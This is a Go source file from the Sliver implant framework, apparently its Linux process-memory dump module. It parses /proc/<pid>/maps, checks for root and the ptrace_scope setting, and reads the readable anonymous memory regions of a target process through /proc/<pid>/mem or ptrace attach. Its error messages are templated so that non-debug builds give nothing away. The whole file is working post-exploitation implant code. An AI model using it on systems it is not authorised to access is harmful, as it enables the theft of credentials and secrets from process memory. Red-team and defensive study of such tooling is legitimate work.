// +linux

package procdump

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"syscall"
)

/*
	Sliver Implant Framework
	Copyright (C) 2022 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// A struct to hold information about each region of memory
type MemoryRegion struct {
	// Start address of the region
	start uint64

	// End address of the region
	end uint64

	/*
		Flag that indicates if this region is mapped to a file
		on disk. Currently, we are only dumping regions that
		are not backed by a file on disk.
	*/
	isFile bool
	
	// File name - only populated if isFile is true
	fileName string
}

// A regex for each line of /proc/<PID>/maps
var mapLineModel = regexp.MustCompile(`^(\w+)-(\w+)\s+(\S+)\s+\S+\s+(\S+)\s+\d+\s*(\S+)?$`)

// LinuxDump - Structure implementing the ProcessDump
// interface for linux processes
type LinuxDump struct {
	data []byte
}

// Data - Returns the byte array corresponding to a process memory
func (d *LinuxDump) Data() []byte {
	return d.data
}

/*
	Map out the application's memory using /proc/<pid>/maps

	Map format:
	    (1)          (2)      (3)    (4)     (5)   (6)                             (7)
	7f926c0b0000-7f926c0d5000 r--s 00000000 08:03 4327445                    /usr/share/mime/mime.cache

	1: Start address of the memory region
	2: End address of the memory region
	3: Permissions (rwx) and p/s (p=private, s=shared)
	4: Offset (offset in bytes into the file, field 7): This is only relevant to files
	5: Device ID (the major:minor device ID of the disk that contains the file) - 00:00 for non-file mappings
	6: inode on the device
	7: Filename (empty if the mapping is not a file)
*/

func parseMap(mapLine string) *MemoryRegion {
	regionInformation := mapLineModel.FindStringSubmatch(mapLine)
	
	if regionInformation == nil {
		// No match
		return nil
	}

	if strings.HasPrefix(regionInformation[3], "r") {
		// This section of memory is readable, and we will return it
		
		/*
			There is a bug in how ptrace reads the vvar region of memory,
			see https://lkml.iu.edu/hypermail/linux/kernel/1503.1/03733.html

			The vvar region is for shared kernel variables

			If this is vvar, then skip it so that we do not run into errors
			due to it later

			In testing, other regions reserved by the kernel proved problematic,
			namely vdso and vsyscall. Those regions likely do not contain any
			sensitive information, so they can be skipped.
		*/
		if regionInformation[5] == "[vvar]" || regionInformation[5] == "[vdso]" || regionInformation[5] == "[vsyscall]" {
			return nil
		}

		memRegion := MemoryRegion{}
		regionStart, err := strconv.ParseUint(regionInformation[1], 16, 64)
		if err != nil {
			// Something is wrong with this region, discard this record
			return nil
		}
		memRegion.start = regionStart

		regionEnd, err := strconv.ParseUint(regionInformation[2], 16, 64)
		if err != nil {
			// Something is wrong with this region, discard this record
			return nil
		}
		
		memRegion.end = regionEnd

		if regionInformation[4] == "00:00" {
			// Then this is not a file
			memRegion.isFile = false
			memRegion.fileName = ""
		} else {
			memRegion.isFile = true
			memRegion.fileName = regionInformation[5]
		}
		return &memRegion
	}
	
	return nil
}

/* 
	Create a map of the process' memory from /proc/<PID>/maps
	Return: a slice of MemoryRegions, number of bytes represented by the map
*/
func createMemoryMap(pid int32) ([]*MemoryRegion, uint64, error) {
	maps, err := os.Open("/proc/" + strconv.FormatInt(int64(pid), 10) + "/maps")

	if err != nil {
		// Could not open the map
		return nil, 0, fmt.Errorf("{{if .Config.Debug}}Could not open memory map for the process{{end}}")
	}

	defer maps.Close()

	var memorySize uint64 = 0
	var completeMemoryMap []*MemoryRegion

	buffer := bufio.NewReader(maps)
	line, err := buffer.ReadString('\n')

	// Keep reading until we hit an error
	for err == nil {
		memoryMapInfo := parseMap(strings.TrimSpace(line))
		// Only concerned about regions not backed by a file on disk
		if memoryMapInfo != nil && !memoryMapInfo.isFile {
			completeMemoryMap = append(completeMemoryMap, memoryMapInfo)
			memorySize += memoryMapInfo.end - memoryMapInfo.start
		}
		// Read the next line
		line, err = buffer.ReadString('\n')
	}

	// End of file is OK - anything else is not.
	if err != nil && err != io.EOF {
		return nil, 0, fmt.Errorf("{{if .Config.Debug}}Error encountered reading through memory maps{{end}}")
	}

	return completeMemoryMap, memorySize, nil
}

func checkPermissions() (bool, error) {
	/*
		Check to see if we are root.
		According to the proc man page, we need root unless the process has the dumpable flag.
		Unless it becomes necessary to check for the dumpable flag, we will keep things simple
		and require root.
	*/
	if currentUID := os.Getuid(); currentUID != 0 {
		return false, fmt.Errorf("{{if .Config.Debug}}Must be root to read memory from another process{{end}}")
	}

	/*
		Check to make sure /proc/sys/kernel/yama/ptrace_scope is not 3
		(dumping process memory does not work with a ptrace_scope value of 3)

		Yama was merged in kernel 3.4

		If reading the value fails, it might be because it is not there. Should not be a permissions
		issue because if we make it here, we are root. If it is not there, this might be a super old kernel.
	*/
	ptrace_scope, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	if err != nil {
		// Even if we get an error here, we should try to read process memory anyway.
		return true, nil
	}

	if strings.TrimSpace(string(ptrace_scope)) == "3" {
		return false, fmt.Errorf("{{if .Config.Debug}}ptrace_scope is too restrictive{{end}}")
	}
	
	return true, nil
}

func isOldKernelVersion() bool {
	kernelVersionRegex := regexp.MustCompile(`^(\d+)\.(\d+).*$`)

	/*
		/proc/sys/kernel/osrelease has the version number of the kernel
		If it is less than 3.3, you can only read memory from the process by attaching
		to it with ptrace
	*/
	kernelVersion, err := os.ReadFile("/proc/sys/kernel/osrelease")
	if err != nil {
		/*
			If this does not exist or is not readable, use the ptrace method
			since that should work for all kernels (assuming we have the
			correct permissions which we will check)
		*/
		return true
	}

	majorMinorKVer := kernelVersionRegex.FindStringSubmatch(strings.TrimSpace(string(kernelVersion)))

	if majorMinorKVer == nil {
		// The kernel version did not match the expected format, use the ptrace method
		return true
	}

	majorKVer, err := strconv.Atoi(majorMinorKVer[1])
	if err != nil {
		// Unable to determine kernel version so use the ptrace method to be safe
		return true
	}
	
	if majorKVer > 3 {
		// We can read directly from /proc/pid/mem on 4.x+ kernels
		return false
	} else if majorKVer == 3 {
		minorKVer, err := strconv.Atoi(majorMinorKVer[2])
		if err != nil {
			// Unable to determine the minor kernel version, so use the ptrace method to be safe
			return true
		}

		if minorKVer >= 3 {
			// We can read directly from /proc/pid/mem starting with kernel 3.3
			return false
		} else {
			return true
		}
	} else {
		// If the kernel version is 2.x or lower, we have to use ptrace
		return true
	}
}

func dumpProcess(pid int32) (ProcessDump, error) {
	res := &LinuxDump{}

	usePTrace := isOldKernelVersion()

	permissionsOK, err := checkPermissions()
	
	if !permissionsOK || err != nil {
		return res, err
	}

	processRegions, dumpSize, err := createMemoryMap(pid)
	if err != nil {
		return res, err
	}

	// Create a buffer to put the memory
	res.data = make([]byte, dumpSize)

	currentDumpOffset := 0

	if usePTrace {
		// Attach to the process using ptrace
		proc, err := os.FindProcess(int(pid))
		if err != nil {
			// Then the process does not exist
			return res, fmt.Errorf("{{if .Config.Debug}}Could not attach to the process, process does not exist{{end}}")
		}
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		err = syscall.PtraceAttach(int(pid))
		if err != nil {
			return res, fmt.Errorf("{{if .Config.Debug}}Could not attach to the process{{end}}")
		}

		_, err = proc.Wait()
		
		if err != nil {
			return res, fmt.Errorf("{{if .Config.Debug}}Failure in waiting for the process after attaching{{end}}")
		}

		// Read the memory, region by region
		for _, region := range(processRegions) {
			numberOfBytes := int(region.end - region.start)
			bytesRead, err := syscall.PtracePeekData(int(pid), uintptr(region.start), res.data[currentDumpOffset:currentDumpOffset + numberOfBytes])
			if err != nil {
				return res, fmt.Errorf("{{if .Config.Debug}}Error reading process memory{{end}}")
			}
			currentDumpOffset += bytesRead
		}
		
		// Do not forget to detach when we are done
		// Send a continue signal so that the process resumes (attaching with ptrace pauses the process)
		err = syscall.Kill(int(pid), syscall.SIGCONT)
		if err != nil {
			return res, fmt.Errorf("{{if .Config.Debug}}Sending continue signal failed - the process is likely hung. Recommend killing it.{{end}}")
		}

		err = syscall.PtraceDetach(int(pid))
		if err != nil {
			return res, fmt.Errorf("{{if .Config.Debug}}Could not detach from the process - the process is likely hung. Recommend killing it.{{end}}")
		}
		
	} else {
		// Open the memory "file"
		processMemory, err := os.Open("/proc/" + strconv.FormatInt(int64(pid), 10) + "/mem")

		if err != nil {
			return res, fmt.Errorf("{{if .Config.Debug}}Could not open process memory{{end}}")
		}

		defer processMemory.Close()

		for _, region := range(processRegions) {
			/*
				Figure out the size of the memory region to read so we know how big of
				a slice to cut from the buffer
			*/
			numberOfBytes := int(region.end - region.start)
			bytesRead, err := processMemory.ReadAt(res.data[currentDumpOffset:currentDumpOffset + numberOfBytes], int64(region.start))
			if err != nil && err != io.EOF {
				return res, fmt.Errorf("{{if .Config.Debug}}Error reading process memory{{end}}")
			}
			currentDumpOffset += bytesRead
		}
	}

	return res, nil
}
